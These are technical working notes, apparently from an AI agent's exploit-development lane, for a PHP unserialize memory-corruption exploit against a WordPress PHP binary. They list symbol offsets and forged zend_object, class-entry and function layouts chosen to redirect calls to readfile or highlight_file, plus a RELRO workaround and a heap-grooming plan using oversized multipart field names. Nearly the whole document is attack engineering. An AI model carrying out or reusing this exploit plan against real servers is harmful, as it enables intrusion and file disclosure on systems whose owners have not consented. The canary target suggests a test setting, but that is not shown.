# glm4 lane notes — WP last-mile execution (binary: glm3/bin/libphp-wp-x86.so)

Binary reality (cb1): lane container is NATIVE aarch64 php 8.2.34 NTS.
All VAs below are file VAs of libphp-wp-x86.so; runtime addr = B + VA
where B = libphp.so load bias (read from /proc/<apache-child>/maps as
root; children FORK from the parent so B is constant across the pool
until restart).

## cb2 — derived offsets (nm, this binary)
- php_var_unserialize        0x3c1210
- php_var_unserialize_destroy 0x3c118c
- var_destroy                0x3c0e40
- var_push_dtor              0x3be780
- var_tmp_var                0x3be6d0
- zend_call_function         0x45206c
- zif_readfile               0x3743a0
- zif_system                 0x36ff48   (zif_passthru 0x36ff50)
- zif_highlight_file         0x367688
(zend_call_known_instance_method[_with_1_params] inlined/static — not
needed as symbols; they're the mechanism.)

## cb2 — fake func candidates (F = E-64; find_fake_func.py works as-is)
handler@+72, fn_flags@+4, scope/ce-read@+16, num_args@+32, arg_info@+40
(aarch64 layout — matches glm3). All candidates: type@F != 2 (56/136/
72/144/176) and fn_flags=0 → NO closure bit → no RELEASE_THIS on RELRO
obj (requirement re-verified in php-src-83 zend_execute_API.c: zend_call_
function has NO ZEND_ACC_PUBLIC check on this path; type!=2 → release
build dispatches straight to handler(call, retval)).

Send-mode = (arg_info[0].type >> 24) & 3, arg_info@F+40 = PREVIOUS FE's
handler slot (a .text VA), so arg_info[0].type = code bytes there:
  readfile  E=0xefa3f0 F=0xefa3b0  send=1 (PREFER → by-value OK)
  system    E=0xefa2b0 F=0xefa270  send=2 (MUST-ref → avoid)
  passthru  E=0xefa2d0 F=0xefa290  send=2 (avoid)
  highlight_file E=0xef8f90 F=0xef8f50 send=0 (clean by-value) ★
  show_source    E=0xef8fb0 F=0xef8f70 send=1 (OK)
Arg 1 by-value path: ARG_SHOULD... true→ arg not ref → ARG_MAY==PREFER
→ no must_wrap → ZVAL_COPY of the /CANARY string. ★ = highlight_file
cleanest; readfile OK. num_args@F+32 huge (>=1) for all.

## cb2 — CRITICAL divergence from glm3 static-L design
GNU_RELRO = [0xe60558, 0xF00000) covers ALL of .data.rel.ro → every
candidate's W = *(F+16) (an arg_info-table VA, e.g. 0xe8dea0 for
readfile) is READ-ONLY at runtime. glm3's "L = W+336, data[0]@L+16 ==
W+352 == ce->__unserialize" SELF-WRITE is DEAD on this binary (write
to W+352 → segfault).

Adaptation (ce chain in the groom — d chunk is fully attacker bytes):
- data[0] = {V, type_info, u2=2}: V = groom addr (zend_object*).
  ce = *(V+16) = C (groom bytes we wrote); func = *(C+352) = F
  (groom write). obj=V is never refcounted (fn_flags=0, no closure).
- last_dtor = L: FREE choice now. Groom or zeroed bss
  (0xf08e40..0xf28e10, RW, outside RELRO). d.last@0 = L2 (separate
  zeroed var_entries area, bss or groom), entries.next@+64 = NULL.
- data[1] = {&zstr,0x106,0}: zstr = groom zend_string "/CANARY" with
  refcount set high (survives ZVAL_COPY + releases: initial 5).
- Groom layout must dodge decode bookkeeping: d.entries@+56 (embedded
  var_entries) is written by var_push (used_slots grows with token
  count, few slots → clobbers up to ~+232); place V/C/F/zstr after
  +240 within the 8216B chunk.
- efree_size(L,4096) at var_destroy tail: if L in groom, header at
  L-16 is OUR bytes (forge benign); if L in bss, header bytes are
  known statics (glm3's original analysis path). Decide at cb4 with
  the response-signature oracle.

## cb2 — var_push/var_destroy mechanics re-verified (php-src-83)
- tmp_var(): last_dtor non-NULL + used_slots+num <= 255 → REUSES fake
  entries at L, NO new chunk ��� first_dtor stays NULL. CONSEQUENCE:
  var_destroy walks first_dtor (NULL!) → dtor loop SKIPPED. FIX: the
  groom must pre-set first_dtor@+8 = L TOO (then both walks hit L;
  var_destroy efree's L once — one entries chunk). Set last_dtor =
  first_dtor = L in the fake d. (glm3's "set by tmp_var" was for the
  emalloc path; on the reuse path it is NOT set — this lane writes it
  directly.)
- ZVAL_COPY_VALUE copies value+u1 only (u2 NOT copied); the
  VAR_UNSERIALIZE_FLAG=2 in u2 comes from Z_EXTRA_P(tmp) set by the
  decoder at the dup-property site (line ~811), NOT from the old
  value's u2 — simpler than glm3's key-collision engineering.
- var_destroy call: zend_call_known_instance_method_with_1_params(
  Z_OBJCE_P(zv)->__unserialize, Z_OBJ_P(zv), NULL, &param) with
  param = ZVAL_COPY(data[i+1]) — obj = data[0].value = V (groom).
- zend_call_function: fn_flags=0 & object!=NULL → HAS_THIS frame,
  no RELEASE_THIS (closure bit absent) → RELRO F safe.

## Next (cb4+): groom placement
17-page class reclaim via ~8193B multipart field NAME (estrdup).
Bias B from /proc maps; placement oracle = response signature.
